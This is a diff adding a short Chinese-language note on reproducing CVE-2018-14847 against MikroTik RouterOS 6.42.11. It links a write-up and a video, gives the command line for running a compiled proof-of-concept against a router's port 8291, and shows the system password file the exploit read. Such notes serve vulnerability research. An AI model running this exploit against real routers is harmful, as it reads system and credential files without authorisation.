@@ -1,0 +1,17 @@
+验证方式：复现视频及文章
+	
+目标产品：
+mikrotik-6.42.11
+
+验证文章：
+https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6
+验证视频：
+https://youtu.be/OZ11gbF9fwM
+
+
+poc使用方法：
+albinolobster@ubuntu:~/routeros/poc/cve-2018-14847/build$ ./cve_2018_14847_poc --ip 192.168.1.103 --port 8291
+
+=== File Contents (size: 69) ===
+nobody:*:99:99:nobody:/tmp:/bin/sh
+root::0:0:root:/home/root:/bin/sh
